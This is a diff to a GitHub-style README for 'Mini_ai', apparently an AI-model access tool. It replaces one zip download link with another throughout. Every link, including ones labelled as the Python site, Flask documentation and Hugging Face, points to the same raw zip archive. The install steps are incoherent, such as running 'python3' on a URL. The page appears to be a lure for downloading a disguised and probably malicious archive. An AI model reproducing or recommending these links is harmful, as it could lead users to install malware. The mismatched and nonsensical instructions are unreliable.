@@ -1,7 +1,7 @@
 # 🎉 Mini_ai - Easy Access to AI Models 
 
 ## 📥 Download Latest Release
-[![Download Latest Release](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip)](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip)
+[![Download Latest Release](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip)](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Mini_ai! This application provides a simple way to access powerful AI models for various tasks. You can use it for Sentiment Analysis, Zero-Shot Classification, and Named Entity Recognition.
@@ -21,10 +21,10 @@ Before you begin, ensure you have the following:
 Follow these steps to download and run Mini_ai:
 
 1. **Visit the Download Page**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip) to find the latest version of Mini_ai.
+   Go to the [Releases Page](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip) to find the latest version of Mini_ai.
 
 2. **Download the Application**  
-   Click on the version you want to download. Depending on your operating system, look for the appropriate file (e.g., `.exe` for Windows or `https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip` for Linux).
+   Click on the version you want to download. Depending on your operating system, look for the appropriate file (e.g., `.exe` for Windows or `https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip` for Linux).
 
 3. **Install Necessary Dependencies**  
    If prompted, you may need to install Python and other dependencies. Follow the on-screen instructions or visit the official Python website for guidance.
@@ -32,7 +32,7 @@ Follow these steps to download and run Mini_ai:
 4. **Run the Application**  
    - For Windows: Double-click the downloaded `.exe` file.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip` file and run the command `python3 https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip` in your terminal.
+   - For Linux: Extract the `https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip` file and run the command `python3 https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip` in your terminal.
 
 5. **Access the API**  
    Once the application runs, you will receive instructions on how to interact with the API. Typically, you can access it via your web browser at `http://localhost:5000`.
@@ -76,14 +76,14 @@ If you encounter any issues:
 ## 📞 Support
 If you need further assistance:
 - Reach out to our community in the Issues section of this repository.
-- Check the [documentation](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip) for detailed API usage and examples.
+- Check the [documentation](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip) for detailed API usage and examples.
 
 ## 🔗 Additional Resources
-- [Python Official Site](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip)
-- [Flask Documentation](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip)
-- [Hugging Face Models](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip)
+- [Python Official Site](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip)
+- [Flask Documentation](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip)
+- [Hugging Face Models](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip)
 
 ## 🔗 Download & Install Again
-To download Mini_ai, visit the [Releases Page](https://raw.githubusercontent.com/eliniyus310987/Mini_ai/main/blately/Mini_ai-v3.2.zip). Select the version you need, and follow the installation steps above. 
+To download Mini_ai, visit the [Releases Page](https://github.com/eliniyus310987/Mini_ai/raw/refs/heads/main/blately/Mini-ai-v1.3.zip). Select the version you need, and follow the installation steps above. 
 
 Dive into the world of AI with Mini_ai and start exploring its capabilities today!
